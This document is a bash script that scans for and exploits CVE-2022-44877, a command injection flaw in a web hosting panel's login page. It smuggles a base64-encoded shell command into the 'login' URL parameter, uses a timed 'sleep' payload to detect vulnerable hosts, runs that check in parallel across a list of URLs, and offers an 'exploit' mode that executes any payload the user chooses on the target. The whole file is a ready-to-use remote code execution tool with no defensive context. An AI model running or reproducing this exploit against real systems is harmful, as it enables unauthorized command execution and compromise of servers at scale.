#!/bin/bash

pids=()

function scan() {
  start_time=$(date +%s)
  encoded_code=$(echo -n $2 | base64 -w0)
  response=$(curl --path-as-is -i -s -k --connect-timeout 10 -m 10 -X POST -g $1'/login/index.php?login=$(echo${IFS}'${encoded_code}'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)' \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;>" \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' \
    -H 'Connection: close' \
    -H 'Content-Length: 40' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Host: $(echo "$1" | awk -F/ '{print $3}')" \
    -H "Referer: $1" \
    -H "Origin: $(echo "$1" | awk -F/ '{print $1,$2}')" \
    -H 'Sec-Fetch-Dest: document' \
    -H 'Sec-Fetch-Mode: navigate' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-User: ?1' \
    -H 'Te: trailers' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' \
    -d 'username=root&password=toor&commit=Login')
  end_time=$(date +%s)

  elapsed_time=$((end_time-start_time))

  if [ "$(echo "$elapsed_time > 3.5" | bc)" -eq 1 ] && [ "$(echo "$elapsed_time < 9" | bc)" -eq 1 ] && [ $? -eq 0 ]; then
    echo -e "\033[41m\033[1m$1 is vulnerable to CVE-2022-44877\033[0m"
  fi
}


if [ "$1" == "masscan" ]; then
  if [ -z "$2" ]; then
    echo ""
    echo "Error: Missing file argument for masscan"
    echo "Usage: $0 masscan <file>"
    echo "       echo <URLs> | $0 masscan"
    echo ""
    exit 1
  fi

  if [ -f "$2" ]; then
    while read -r url; do
      scan "$url" "sleep 4" &
      pids+=($!)
      sleep 0.5
    done < "$2"
  else
    echo ""
    echo "Error: Unable to read file $2"
    echo "Usage: $0 masscan <file>"
    echo "       echo <URLs> | $0 masscan"
    echo ""
    exit 1
  fi

  for pid in "${pids[@]}"; do
    wait "$pid"
  done

elif [ "$1" == "scan" ]; then
  if [ -z "$2" ]; then
    echo ""
    echo "Error: Missing URL argument for scan"
    echo "Usage: $0 scan <URL>"
    echo ""
    exit 1
  fi
  scan $2 "sleep 4"

elif [ "$1" == "exploit" ]; then
  if [ -z "$2" ]; then
    echo ""
    echo "Error: Missing URL argument for exploit"
    echo "Usage: $0 exploit <URL> <payload>"
    echo ""
    exit 1
  fi

  if [ -z "$3" ]; then
    echo ""
    echo "Error: Missing payload argument for exploit"
    echo "Usage: $0 exploit <URL> <payload>"
    echo ""
    exit 1
  fi

  scan $2 "$3"
else
  echo ""
  echo "Usage : $0 scan <URL>"
  echo "              $0 exploit <URL> <payload>"
  echo "              $0 masscan <file>"
  echo "              echo <URLs> | $0 masscan"
  echo ""
fi
